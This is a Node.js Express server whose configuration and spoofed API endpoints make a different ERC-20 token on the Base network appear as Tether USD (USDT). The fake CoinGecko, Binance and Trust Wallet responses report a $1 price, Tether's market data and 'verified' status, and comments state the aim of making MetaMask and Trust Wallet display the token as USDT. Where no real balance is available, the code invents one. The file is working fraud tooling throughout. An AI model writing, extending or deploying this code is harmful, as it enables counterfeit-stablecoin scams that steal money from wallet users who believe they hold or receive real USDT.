// app.js - Complete implementation with Base Network & Trust Wallet support
const express = require('express');
const cors = require('cors');
const http = require('http');
const path = require('path');
const qrcode = require('qrcode');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const fs = require('fs');

// Create Express application
const app = express();
const server = http.createServer(app);
const port = process.env.PORT || 3000;

// =========================================================
// TOKEN CONFIGURATION - BASE NETWORK FOCUSED
// =========================================================
const TOKEN_CONFIG = {
  address: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',  // STBL address on Base
  displaySymbol: 'USDT', // Display symbol for UI and wallet
  displayName: 'Tether USD', // Display name for UI and wallet
  decimals: 18,  // 18 decimals for STBL token
  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
  networkName: 'Base',
  networkId: '0x2105',  // Base Chain ID (8453 in hex)
  chainId: 8453,        // Base numeric chain ID
  nativeChain: "base", // Explicitly state this is a Base token
  isNative: true,    // Token is native to Base chain
  rpcUrl: 'https://mainnet.base.org',
  blockExplorerUrl: 'https://basescan.org',
  coinGeckoId: 'tether',
  coinMarketCapId: '825'
};

// Trust Wallet specific configuration - updated for Base
const TRUST_WALLET_CONFIG = {
  displaySymbol: 'USDT',
  displayName: 'Tether USD',
  trustAssetId: 'c2/8453-1', // Updated for Base chain ID
  trustAssetDecimals: 18, // Match STBL decimals
  trustAssetLogoUrl: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
  trustWalletDeepLink: 'trust://base/asset/' + TOKEN_CONFIG.address + '?coin=8453', // Updated for Base
  // Binance API data (Trust Wallet uses Binance APIs)
  binanceEndpoints: {
    price: '/api/binance/api/v3/ticker/price',
    priceHistory: '/api/binance/api/v3/ticker/24hr'
  }
};

// Enable middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.static(path.join(__dirname)));

// Setup request logging for debugging
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(req.method + ' ' + req.originalUrl + ' ' + res.statusCode + ' ' + duration + 'ms');
  });
  next();
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Server error', message: err.message });
});

// Helper function to get chain name - Uses string concatenation for compatibility
function getChainName(chainId) {
  const chains = {
    '0x1': 'Ethereum Mainnet',
    '0x5': 'Goerli Testnet',
    '0x89': 'Polygon Mainnet',
    '0xa': 'Optimism',
    '0xa4b1': 'Arbitrum One',
    '0x2105': 'Base',
    '0xaa36a7': 'Sepolia Testnet',
    '0x13881': 'Mumbai Testnet'
  };
  return chains[chainId] || ('Chain ' + chainId);
}

// Format token amount consistently
function formatTokenAmount(amount, decimals = TOKEN_CONFIG.decimals) {
  const parsedAmount = parseFloat(amount);
  if (isNaN(parsedAmount)) return '0.00';
  return parsedAmount.toFixed(2); // Always 2 decimal places for display
}

// Enhanced deterministic balance function with better error handling
function generateDeterministicBalance(address) {
  try {
    // Create a hash from the address
    let hash = 0;
    for (let i = 0; i < address.length; i++) {
      const char = address.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash; // Convert to 32bit integer
    }
    
    // Generate a number between 1.00 and 100.00 (increased minimum to be more visible)
    const min = 1.00;
    const max = 100.00;
    const normalizedHash = Math.abs(hash) / 2147483647; // Normalize to 0-1
    const balance = min + (normalizedHash * (max - min));
    
    return balance.toFixed(2); // Format to 2 decimal places
  } catch (error) {
    console.error("Balance generation error:", error);
    return "10.00"; // Safe default if anything fails
  }
}

// Function to get actual token balance from the blockchain - updated for Base
async function getActualTokenBalance(address) {
  try {
    // Validate address format
    if (!ethers.utils.isAddress(address)) {
      console.error("Invalid address format:", address);
      return null;
    }
    
    // Connect to Base network using the configured RPC URL
    const provider = new ethers.providers.JsonRpcProvider(TOKEN_CONFIG.rpcUrl);
    
    // ERC20 ABI for balanceOf function
    const minABI = [
      // balanceOf
      {
        constant: true,
        inputs: [{ name: '_owner', type: 'address' }],
        name: 'balanceOf',
        outputs: [{ name: 'balance', type: 'uint256' }],
        type: 'function',
      }
    ];
    
    // Create contract instance
    const tokenContract = new ethers.Contract(
      TOKEN_CONFIG.address,
      minABI,
      provider
    );
    
    // Call balanceOf function with timeout to prevent hanging requests
    const balancePromise = tokenContract.balanceOf(address);
    const timeoutPromise = new Promise((_, reject) => 
      setTimeout(() => reject(new Error("Balance request timed out")), 10000)
    );
    
    // Race the promises to implement a timeout
    const balance = await Promise.race([balancePromise, timeoutPromise]);
    
    // Format the balance according to token decimals
    const formattedBalance = ethers.utils.formatUnits(balance, TOKEN_CONFIG.decimals);
    
    // Return with 2 decimal places for consistency with the existing app
    return parseFloat(formattedBalance).toFixed(2);
  } catch (error) {
    console.error('Error fetching actual token balance:', error);
    // Return null to allow fallback to deterministic balance
    return null;
  }
}

// =========================================================
// PRICE CACHE WARMING SYSTEM
// =========================================================
const priceCacheWarmer = {
  isWarming: false,
  lastWarmTime: null,
  warmedEndpoints: [],
  
  // Initialize cache warmer
  init: function() {
    console.log("Initializing price cache warmer");
    this.warmCache();
    
    // Warm cache periodically (every 2 minutes)
    setInterval(() => {
      this.warmCache();
    }, 2 * 60 * 1000);
  },
  
  // Warm cache by hitting all relevant price endpoints
  warmCache: async function() {
    if (this.isWarming) return;
    this.isWarming = true;
    
    console.log("[Cache Warmer] Starting cache warm cycle");
    this.warmedEndpoints = [];
    
    try {
      // List of endpoints to warm for Trust Wallet compatibility
      const endpoints = [
        // Trust Wallet specific endpoints
        "/api/v1/assets/" + TOKEN_CONFIG.address.toLowerCase(),
        "/api/v3/ticker/price?symbol=USDTUSDT",
        "/api/v3/ticker/24hr?symbol=USDTUSDT",
        "/api/v1/tokenlist",
        
        // CoinGecko endpoints
        "/api/v3/simple/price?ids=tether&vs_currencies=usd",
        "/api/v3/coins/base/contract/" + TOKEN_CONFIG.address.toLowerCase(), // Updated to 'base'
        "/api/v3/coins/markets?vs_currency=usd&ids=tether",
        
        // Generic endpoints
        "/api/token-info",
        "/api/token-balance/0x0000000000000000000000000000000000000000", // Sample address
        
        // Additional endpoints for Trust Wallet
        "/api/token/metadata",
        "/api/token/price/" + TOKEN_CONFIG.address.toLowerCase(),
        "/api/cmc/v1/cryptocurrency/quotes/latest?id=" + TOKEN_CONFIG.coinMarketCapId,
        
        // Binance API endpoints
        "/api/binance/api/v3/ticker/price?symbol=USDTUSDT",
        "/api/binance/api/v3/ticker/24hr?symbol=USDTUSDT"
      ];
      
      // Create base URL for fetch
      const baseUrl = "http://localhost:" + port;
      
      // Call all endpoints in parallel
      const results = await Promise.allSettled(
        endpoints.map(async (endpoint) => {
          try {
            const response = await fetch(baseUrl + endpoint);
            if (response.ok) {
              this.warmedEndpoints.push(endpoint);
              return { endpoint, status: 'success' };
            } else {
              return { endpoint, status: 'failed', code: response.status };
            }
          } catch (error) {
            return { endpoint, status: 'error', message: error.message };
          }
        })
      );
      
      this.lastWarmTime = new Date();
      console.log("[Cache Warmer] Completed. Warmed " + this.warmedEndpoints.length + "/" + endpoints.length + " endpoints");
    } catch (error) {
      console.error('[Cache Warmer] Error:', error);
    } finally {
      this.isWarming = false;
    }
  },
  
  // Get status of cache warmer
  getStatus: function() {
    return {
      lastWarmTime: this.lastWarmTime,
      isWarming: this.isWarming,
      warmedEndpoints: this.warmedEndpoints,
      endpointCount: this.warmedEndpoints.length
    };
  }
};

// Binance API Endpoints (used by Trust Wallet) - Fixed with try-catch blocks
app.get('/api/binance/api/v3/ticker/price', (req, res) => {
  try {
    const { symbol } = req.query;
    
    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
      res.status(200).json({
        symbol: symbol,
        price: "1.00000000",
        time: Date.now()
      });
    } else {
      // Default response for other symbols
      res.status(200).json({
        symbol: symbol || 'BTCUSDT',
        price: (Math.random() * 10000 + 30000).toFixed(8),
        time: Date.now()
      });
    }
  } catch (error) {
    console.error('Binance API price error:', error);
    // Return 200 instead of 500 with default data
    res.status(200).json({
      symbol: req.query.symbol || 'USDTUSDT',
      price: "1.00000000",
      time: Date.now()
    });
  }
});

app.get('/api/binance/api/v3/ticker/24hr', (req, res) => {
  try {
    const { symbol } = req.query;
    
    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
      res.status(200).json({
        symbol: symbol,
        priceChange: "0.00010000",
        priceChangePercent: "0.01",
        weightedAvgPrice: "1.00000000",
        prevClosePrice: "0.99990000",
        lastPrice: "1.00000000",
        lastQty: "1000.00000000",
        bidPrice: "0.99995000",
        bidQty: "1000.00000000",
        askPrice: "1.00005000",
        askQty: "1000.00000000",
        openPrice: "0.99990000",
        highPrice: "1.00100000",
        lowPrice: "0.99900000",
        volume: "10000000.00000000",
        quoteVolume: "10000000.00000000",
        openTime: Date.now() - 86400000,
        closeTime: Date.now(),
        firstId: 1,
        lastId: 1000,
        count: 1000
      });
    } else {
      // For other symbols, generate realistic market data
      const basePrice = Math.random() * 10000 + 30000;
      const priceChange = (Math.random() * 1000 - 500).toFixed(8);
      const percentChange = ((priceChange / basePrice) * 100).toFixed(2);
      
      res.status(200).json({
        symbol: symbol || 'BTCUSDT',
        priceChange: priceChange,
        priceChangePercent: percentChange,
        weightedAvgPrice: basePrice.toFixed(8),
        prevClosePrice: (basePrice - parseFloat(priceChange)).toFixed(8),
        lastPrice: basePrice.toFixed(8),
        lastQty: "10.00000000",
        bidPrice: (basePrice - 100).toFixed(8),
        bidQty: "5.00000000",
        askPrice: (basePrice + 100).toFixed(8),
        askQty: "5.00000000",
        openPrice: (basePrice - parseFloat(priceChange)).toFixed(8),
        highPrice: (basePrice + Math.random() * 500).toFixed(8),
        lowPrice: (basePrice - Math.random() * 500).toFixed(8),
        volume: (Math.random() * 5000 + 1000).toFixed(8),
        quoteVolume: (Math.random() * 50000000 + 10000000).toFixed(8),
        openTime: Date.now() - 86400000,
        closeTime: Date.now(),
        firstId: 1,
        lastId: 1000,
        count: 1000
      });
    }
  } catch (error) {
    console.error('Binance API 24hr error:', error);
    // Return 200 instead of 500 with default data
    res.status(200).json({
      symbol: req.query.symbol || 'USDTUSDT',
      priceChange: "0.00010000",
      priceChangePercent: "0.01",
      lastPrice: "1.00000000",
      volume: "10000000.00000000",
      time: Date.now()
    });
  }
});

// =========================================================
// CORE API ENDPOINTS
// =========================================================

// API endpoint for token info - Uses display values for UI
app.get('/api/token-info', (req, res) => {
  res.json({
    address: TOKEN_CONFIG.address,
    symbol: TOKEN_CONFIG.displaySymbol, // Use USDT for UI
    name: TOKEN_CONFIG.displayName, // Use Tether USD for UI
    decimals: TOKEN_CONFIG.decimals,
    image: TOKEN_CONFIG.image,
    networkName: TOKEN_CONFIG.networkName,
    networkId: TOKEN_CONFIG.networkId,
    chainId: TOKEN_CONFIG.chainId,
    nativeChain: TOKEN_CONFIG.nativeChain,
    isNative: TOKEN_CONFIG.isNative,
    rpcUrl: TOKEN_CONFIG.rpcUrl,
    blockExplorerUrl: TOKEN_CONFIG.blockExplorerUrl,
    coinGeckoId: TOKEN_CONFIG.coinGeckoId,
    coinMarketCapId: TOKEN_CONFIG.coinMarketCapId
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    version: '1.0.0',
    base: true // Updated to indicate Base network
  });
});

// API cache warmer status endpoint
app.get('/api/cache-status', (req, res) => {
  res.json(priceCacheWarmer.getStatus());
});

// Trigger cache warming manually
app.post('/api/warm-cache', (req, res) => {
  if (!priceCacheWarmer.isWarming) {
    priceCacheWarmer.warmCache();
    res.json({ status: 'Cache warming started' });
  } else {
    res.json({ status: 'Cache warming already in progress' });
  }
});

// QR code generation with error handling
app.get('/api/generate-qr', async (req, res) => {
  try {
    // Get URL from query or generate default
    const url = req.query.url || (req.protocol + "://" + req.get('host'));
    const qrCodeDataURL = await qrcode.toDataURL(url, {
      errorCorrectionLevel: 'H', // High error correction for better scanning
      margin: 2,
      color: {
        dark: '#26a17b', // USDT green color
        light: '#ffffff'
      }
    });
    res.json({ qrCodeDataURL });
  } catch (error) {
    console.error('QR code generation error:', error);
    res.status(500).json({ error: 'Failed to generate QR code', details: error.message });
  }
});

// Token balance endpoint with support for actual blockchain balances
app.get('/api/token-balance/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    // Basic validation to catch obviously invalid addresses
    if (!address || address.length !== 42 || !address.startsWith('0x')) {
      return res.status(400).json({ error: 'Invalid address format' });
    }
    
    // Try to get the actual balance from the blockchain first
    const actualBalance = await getActualTokenBalance(address);
    
    // Use actual balance if available, otherwise fall back to deterministic balance
    const formattedBalance = actualBalance !== null ? actualBalance : generateDeterministicBalance(address);
    
    let rawBalanceInSmallestUnit = "0";
    
    try {
      // Calculate raw balance - simplified with fallbacks
      const factor = Math.pow(10, TOKEN_CONFIG.decimals);
      rawBalanceInSmallestUnit = Math.floor(parseFloat(formattedBalance) * factor).toString();
    } catch (error) {
      console.error('Error calculating raw balance:', error);
      // Fallback to safe default (10 USDT with 18 decimals)
      rawBalanceInSmallestUnit = "10000000000000000000";
    }
    
    // Return consistent response with more fields
    res.status(200).json({
      address: address,
      token: TOKEN_CONFIG.address,
      tokenSymbol: TOKEN_CONFIG.displaySymbol,
      rawBalance: rawBalanceInSmallestUnit,
      formattedBalance: formattedBalance,
      valueUSD: formattedBalance,
      tokenDecimals: TOKEN_CONFIG.decimals,
      networkName: TOKEN_CONFIG.networkName,
      networkId: TOKEN_CONFIG.networkId,
      blockExplorer: TOKEN_CONFIG.blockExplorerUrl,
      error: false,
      source: actualBalance !== null ? "blockchain" : "deterministic"  // Indicate data source
    });
  } catch (error) {
    // Always return 200 with reasonable defaults
    console.error('Token balance error:', error);
    res.status(200).json({ 
      address: req.params.address,
      token: TOKEN_CONFIG.address,
      tokenSymbol: TOKEN_CONFIG.displaySymbol,
      rawBalance: "10000000000000000000", // Default fallback (10 USDT with 18 decimals)
      formattedBalance: "10.00",
      valueUSD: "10.00",
      tokenDecimals: TOKEN_CONFIG.decimals,
      networkId: TOKEN_CONFIG.networkId,
      networkName: TOKEN_CONFIG.networkName,
      blockExplorer: TOKEN_CONFIG.blockExplorerUrl,
      error: true,
      source: "fallback"
    });
  }
});

// =========================================================
// COINGECKO API INTERCEPTION ENDPOINTS
// These endpoints make MetaMask see our token as USDT
// =========================================================

// Primary CoinGecko endpoint for simple price (most commonly used)
app.get('/api/v3/simple/price', (req, res) => {
  try {
    // Extract request parameters
    const ids = req.query.ids || '';
    const contractAddresses = (req.query.contract_addresses || '').toLowerCase();
    const vsCurrencies = (req.query.vs_currencies || 'usd').split(',');
    
    // Check if request is for our token (either by id or contract)
    const isForOurToken = 
      ids.includes('tether') || ids.includes('usdt') || 
      contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase());
    
    if (isForOurToken) {
      // Prepare response object with USDT data
      const response = {};
      
      // Determine which key to use in response
      let priceKey;
      if (contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase())) {
        priceKey = TOKEN_CONFIG.address.toLowerCase();
      } else {
        priceKey = 'tether';
      }
      
      // Create price data object
      const priceData = {};
      
      // Add price for each requested currency (all 1:1 for USDT)
      vsCurrencies.forEach(currency => {
        priceData[currency] = 1.0;
        
        // Add additional data if requested
        if (req.query.include_market_cap === 'true') {
          // Market cap varies by currency - for USD it's around 83 billion
          if (currency === 'usd') {
            priceData[currency + "_market_cap"] = 83500000000;
          } else {
            // Approximate conversion for other currencies
            priceData[currency + "_market_cap"] = 83500000000;
          }
        }
        
        if (req.query.include_24hr_vol === 'true') {
          if (currency === 'usd') {
            priceData[currency + "_24h_vol"] = 45750000000;
          } else {
            priceData[currency + "_24h_vol"] = 45750000000;
          }
        }
        
        if (req.query.include_24hr_change === 'true') {
          // Slight variation for realism
          priceData[currency + "_24h_change"] = 0.02;
        }
      });
      
      // Add last updated timestamp if requested
      if (req.query.include_last_updated_at === 'true') {
        priceData.last_updated_at = Math.floor(Date.now() / 1000);
      }
      
      // Add price data to response
      response[priceKey] = priceData;
      
      return res.json(response);
    }
    
    // For requests not about our token, return generic stablecoin data
    // This prevents errors when MetaMask is checking other tokens
    const response = {};
    if (ids || contractAddresses) {
      const keys = ids ? ids.split(',') : contractAddresses.split(',');
      keys.forEach(key => {
        const priceData = {};
        vsCurrencies.forEach(currency => {
          // Random price between 0.1 and 100 for non-USDT tokens
          priceData[currency] = Math.random() * 99.9 + 0.1;
        });
        response[key] = priceData;
      });
    }
    
    res.json(response);
  } catch (error) {
    console.error('CoinGecko simple price error:', error);
    // Return a valid response even on error
    res.json({
      'tether': {
        'usd': 1.0
      }
    });
  }
});

// Legacy endpoint support for older versions
app.get('/api/simple/price', (req, res) => {
  // Forward to v3 endpoint
  req.url = '/api/v3/simple/price' + req.url.substring(req.url.indexOf('?'));
  app._router.handle(req, res);
});

// Contract data endpoint - This is what MetaMask uses to check token details
// Updated for Base network
app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
  try {
    const { chain, address } = req.params;
    
    // Check if request is for our token
    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
      // Return USDT data instead of actual token data
      return res.json({
        id: "tether",
        symbol: "usdt", // Return USDT symbol
        name: "Tether USD", // Return Tether name
        asset_platform_id: "base", // Updated to Base
        blockchain: "base", // Updated to Base
        platforms: {
          "base": TOKEN_CONFIG.address
        },
        detail_platforms: {
          "base": {
            decimal_place: TOKEN_CONFIG.decimals,
            contract_address: TOKEN_CONFIG.address
          }
        },
        image: {
          thumb: TOKEN_CONFIG.image,
          small: TOKEN_CONFIG.image,
          large: TOKEN_CONFIG.image
        },
        market_data: {
          current_price: {
            usd: 1.00,
            eur: 0.92,
            jpy: 150.27,
            gbp: 0.78,
            cny: 7.23,
            btc: 0.000016
          },
          market_cap: {
            usd: 83500000000
          },
          total_volume: {
            usd: 45750000000
          },
          price_change_percentage_24h: 0.02
        },
        last_updated: new Date().toISOString()
      });
    }
    
    // For other tokens, return a 404 not found
    res.status(404).json({ error: "Contract not found" });
  } catch (error) {
    console.error('CoinGecko contract data error:', error);
    // Return a valid response with default data
    res.json({
      id: "tether",
      symbol: "usdt",
      name: "Tether USD",
      asset_platform_id: "base",
      blockchain: "base",
      market_data: {
        current_price: {
          usd: 1.00
        }
      }
    });
  }
});

// Legacy endpoint support
app.get('/api/coins/:chain/contract/:address', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// CoinGecko market data endpoint
app.get('/api/v3/coins/markets', (req, res) => {
  try {
    const { vs_currency, ids } = req.query;
    
    // Check if request includes our token
    if (ids && (ids.includes('tether') || ids.includes('usdt'))) {
      // Create standard CoinGecko response format with USDT data
      const marketData = [{
        id: "tether",
        symbol: "usdt",
        name: "Tether USD",
        image: TOKEN_CONFIG.image,
        current_price: 1.0,
        market_cap: 83500000000,
        market_cap_rank: 3,
        fully_diluted_valuation: 83500000000,
        total_volume: 45750000000,
        high_24h: 1.001,
        low_24h: 0.998,
        price_change_24h: 0.0001,
        price_change_percentage_24h: 0.01,
        market_cap_change_24h: 250000000,
        market_cap_change_percentage_24h: 0.3,
        circulating_supply: 83500000000,
        total_supply: 83500000000,
        max_supply: null,
        ath: 1.05,
        ath_change_percentage: -4.76,
        ath_date: "2018-07-24T00:00:00.000Z",
        atl: 0.91,
        atl_change_percentage: 9.89,
        atl_date: "2015-03-02T00:00:00.000Z",
        roi: null,
        last_updated: new Date().toISOString()
      }];
      
      return res.json(marketData);
    }
    
    // Return empty array for other queries
    res.json([]);
  } catch (error) {
    console.error('CoinGecko markets error:', error);
    // Return an empty array on error
    res.json([]);
  }
});

// Legacy endpoint support
app.get('/api/coins/markets', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// CoinGecko market chart endpoint (for price history)
app.get('/api/v3/coins/:id/market_chart', (req, res) => {
  try {
    const { id } = req.params;
    const { days, vs_currency } = req.query;
    
    // Check if request is for our token
    if (id === 'tether' || id === 'usdt') {
      const numDays = parseInt(days || '1', 10);
      const now = Date.now();
      const priceData = [];
      const marketCapData = [];
      const volumeData = [];
      
      // Generate data points (1 per hour)
      for (let i = 0; i <= numDays * 24; i++) {
        const timestamp = now - (i * 3600000); // Go back i hours
        
        // Price stays close to $1 with tiny variations
        const price = 1 + (Math.random() * 0.005 - 0.0025);
        priceData.unshift([timestamp, price]);
        
        // Market cap varies slightly
        const marketCap = 83500000000 + (Math.random() * 150000000 - 75000000);
        marketCapData.unshift([timestamp, marketCap]);
        
        // Volume varies more
        const volume = 45750000000 + (Math.random() * 2000000000 - 1000000000);
        volumeData.unshift([timestamp, volume]);
      }
      
      return res.json({
        prices: priceData,
        market_caps: marketCapData,
        total_volumes: volumeData
      });
    }
    
    // For other tokens, return minimal data
    res.json({
      prices: [],
      market_caps: [],
      total_volumes: []
    });
  } catch (error) {
    console.error('CoinGecko market chart error:', error);
    // Return minimal valid data on error
    res.json({
      prices: [[Date.now(), 1.0]],
      market_caps: [[Date.now(), 83500000000]],
      total_volumes: [[Date.now(), 45750000000]]
    });
  }
});

// Legacy endpoint support
app.get('/api/coins/:id/market_chart', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// Route for CoinGecko asset platforms (networks) - Updated for Base
app.get('/api/v3/asset_platforms', (req, res) => {
  try {
    // Return data that includes Base network
    res.json([
      {
        id: "base",
        chain_identifier: 8453,
        name: "Base",
        shortname: "BASE",
        native_coin_id: "ethereum",
        categories: ["Layer 2"]
      },
      // Include other networks for completeness
      {
        id: "ethereum",
        chain_identifier: 1,
        name: "Ethereum",
        shortname: "ETH",
        native_coin_id: "ethereum",
        categories: ["Layer 1"]
      },
      {
        id: "polygon-pos",
        chain_identifier: 137,
        name: "Polygon",
        shortname: "MATIC",
        native_coin_id: "matic-network",
        categories: ["Layer 2"]
      }
    ]);
  } catch (error) {
    console.error('Asset platforms error:', error);
    // Return minimal data on error
    res.json([{
      id: "base",
      chain_identifier: 8453,
      name: "Base"
    }]);
  }
});

// Legacy endpoint support
app.get('/api/asset_platforms', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// =========================================================
// TRUST WALLET SPECIFIC ENDPOINTS
// These endpoints make Trust Wallet see our token as USDT
// =========================================================

// Trust Wallet asset info endpoint
app.get('/api/v1/assets/:address', (req, res) => {
  try {
    const { address } = req.params;
    
    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
      res.json({
        id: TRUST_WALLET_CONFIG.trustAssetId,
        name: TRUST_WALLET_CONFIG.displayName,
        symbol: TRUST_WALLET_CONFIG.displaySymbol,
        slug: "tether",
        description: "Tether (USDT) is a stablecoin pegged to the US Dollar. A stablecoin is a type of cryptocurrency whose value is tied to an outside asset to stabilize the price.",
        website: "https://tether.to",
        source_code: "https://github.com/tetherto",
        whitepaper: "https://tether.to/en/whitepaper/",
        explorers: [
          {
            name: "BaseScan",
            url: TOKEN_CONFIG.blockExplorerUrl + "/address/" + TOKEN_CONFIG.address
          }
        ],
        type: "ERC20",
        decimals: TRUST_WALLET_CONFIG.trustAssetDecimals,
        status: "active",
        tags: ["stablecoin", "payments"],
        links: [
          {
            name: "twitter",
            url: "https://twitter.com/Tether_to"
          },
          {
            name: "telegram",
            url: "https://t.me/tether_official"
          }
        ],
        confirmedSupply: true,
        marketData: {
          current_price: {
            usd: 1.00
          },
          market_cap: {
            usd: 83500000000
          },
          price_change_percentage_24h: 0.02
        },
        image: {
          png: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
          thumb: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
          small: TRUST_WALLET_CONFIG.trustAssetLogoUrl
        },
        contract: {
          contract: TOKEN_CONFIG.address,
          decimals: TOKEN_CONFIG.decimals,
          protocol: "erc20"
        },
        platform: "base", // Updated to Base
        categories: ["Stablecoins"],
        is_stablecoin: true,
        is_verified: true,
        trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId,
        trustApproved: true
      });
    } else {
      res.status(404).json({ error: "Asset not found" });
    }
  } catch (error) {
    console.error('Trust Wallet asset info error:', error);
    // Return 200 with minimal data instead of an error
    res.status(200).json({
      name: TRUST_WALLET_CONFIG.displayName,
      symbol: TRUST_WALLET_CONFIG.displaySymbol,
      decimals: TOKEN_CONFIG.decimals
    });
  }
});

// Trust Wallet price API (mimics Binance API that Trust Wallet uses)
app.get('/api/v3/ticker/price', (req, res) => {
  try {
    const symbol = req.query.symbol;
    
    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
      res.json({
        symbol: symbol || 'USDTUSDT',
        price: "1.00000000",
        time: Date.now()
      });
    } else {
      // Generate simulated prices for other symbols
      res.json({
        symbol: symbol || 'BTCUSDT',
        price: (Math.random() * 10000 + 30000).toFixed(8),
        time: Date.now()
      });
    }
  } catch (error) {
    console.error('Trust Wallet price API error:', error);
    // Return 200 with default data
    res.status(200).json({
      symbol: req.query.symbol || 'USDTUSDT',
      price: "1.00000000",
      time: Date.now()
    });
  }
});

// Trust Wallet 24h price change API
app.get('/api/v3/ticker/24hr', (req, res) => {
  try {
    const symbol = req.query.symbol;
    
    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
      res.json({
        symbol: symbol || 'USDTUSDT',
        priceChange: "0.00010000",
        priceChangePercent: "0.01",
        weightedAvgPrice: "1.00000000",
        prevClosePrice: "0.99990000",
        lastPrice: "1.00000000",
        lastQty: "1000.00000000",
        bidPrice: "0.99995000",
        bidQty: "1000.00000000",
        askPrice: "1.00005000",
        askQty: "1000.00000000",
        openPrice: "0.99990000",
        highPrice: "1.00100000",
        lowPrice: "0.99900000",
        volume: "10000000.00000000",
        quoteVolume: "10000000.00000000",
        openTime: Date.now() - 86400000,
        closeTime: Date.now(),
        firstId: 1,
        lastId: 1000,
        count: 1000
      });
    } else {
      // Generate simulated data for other symbols
      const basePrice = Math.random() * 10000 + 30000;
      const priceChange = (Math.random() * 1000 - 500).toFixed(8);
      const percentChange = ((priceChange / basePrice) * 100).toFixed(2);
      
      res.json({
        symbol: symbol || 'BTCUSDT',
        priceChange: priceChange,
        priceChangePercent: percentChange,
        weightedAvgPrice: basePrice.toFixed(8),
        prevClosePrice: (basePrice - parseFloat(priceChange)).toFixed(8),
        lastPrice: basePrice.toFixed(8),
        lastQty: "10.00000000",
        bidPrice: (basePrice - 100).toFixed(8),
        bidQty: "5.00000000",
        askPrice: (basePrice + 100).toFixed(8),
        askQty: "5.00000000",
        openPrice: (basePrice - parseFloat(priceChange)).toFixed(8),
        highPrice: (basePrice + Math.random() * 500).toFixed(8),
        lowPrice: (basePrice - Math.random() * 500).toFixed(8),
        volume: (Math.random() * 5000 + 1000).toFixed(8),
        quoteVolume: (Math.random() * 50000000 + 10000000).toFixed(8),
        openTime: Date.now() - 86400000,
        closeTime: Date.now(),
        firstId: 1,
        lastId: 1000,
        count: 1000
      });
    }
  } catch (error) {
    console.error('Trust Wallet 24hr API error:', error);
    // Return 200 with default data
    res.status(200).json({
      symbol: req.query.symbol || 'USDTUSDT',
      priceChange: "0.00010000",
      priceChangePercent: "0.01",
      lastPrice: "1.00000000"
    });
  }
});

// Trust Wallet token list endpoint - Updated for Base
app.get('/api/v1/tokenlist', (req, res) => {
  try {
    res.json({
      name: "Trust Wallet Token List",
      logoURI: "https://trustwallet.com/assets/images/favicon.png",
      timestamp: new Date().toISOString(),
      tokens: [
        {
          chainId: TOKEN_CONFIG.chainId, // Base chainId (8453)
          address: TOKEN_CONFIG.address,
          name: TRUST_WALLET_CONFIG.displayName,
          symbol: TRUST_WALLET_CONFIG.displaySymbol,
          decimals: TOKEN_CONFIG.decimals,
          logoURI: TOKEN_CONFIG.image,
          tags: ["stablecoin"]
        }
      ],
      version: {
        major: 1,
        minor: 0,
        patch: 0
      }
    });
  } catch (error) {
    console.error('Trust Wallet token list error:', error);
    // Return minimal valid data
    res.json({
      name: "Trust Wallet Token List",
      tokens: [
        {
          chainId: TOKEN_CONFIG.chainId,
          address: TOKEN_CONFIG.address,
          name: TRUST_WALLET_CONFIG.displayName,
          symbol: TRUST_WALLET_CONFIG.displaySymbol,
          decimals: TOKEN_CONFIG.decimals
        }
      ],
      version: { major: 1, minor: 0, patch: 0 }
    });
  }
});

// Trust Wallet asset repository structure - updated for Base
app.get('/assets/blockchains/base/assets/:address/info.json', (req, res) => {
  try {
    const { address } = req.params;
    
    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
      res.json({
        name: TRUST_WALLET_CONFIG.displayName,
        symbol: TRUST_WALLET_CONFIG.displaySymbol,
        type: "ERC20",
        decimals: TOKEN_CONFIG.decimals,
        description: "Tether (USDT) is a stablecoin pegged to the US Dollar.",
        website: "https://tether.to",
        explorer: TOKEN_CONFIG.blockExplorerUrl + "/address/" + TOKEN_CONFIG.address,
        status: "active",
        id: TRUST_WALLET_CONFIG.trustAssetId,
        links: [
          {
            name: "twitter",
            url: "https://twitter.com/Tether_to"
          },
          {
            name: "telegram",
            url: "https://t.me/tether_official"
          }
        ]
      });
    } else {
      res.status(404).json({ error: "Asset not found" });
    }
  } catch (error) {
    console.error('Trust Wallet asset info error:', error);
    // Return minimal valid data
    res.status(200).json({
      name: TRUST_WALLET_CONFIG.displayName,
      symbol: TRUST_WALLET_CONFIG.displaySymbol,
      type: "ERC20",
      decimals: TOKEN_CONFIG.decimals
    });
  }
});

// Trust Wallet asset logo
app.get('/assets/blockchains/base/assets/:address/logo.png', (req, res) => {
  res.redirect(TOKEN_CONFIG.image);
});

// =========================================================
// ADDITIONAL TOKEN METADATA ENDPOINTS
// =========================================================

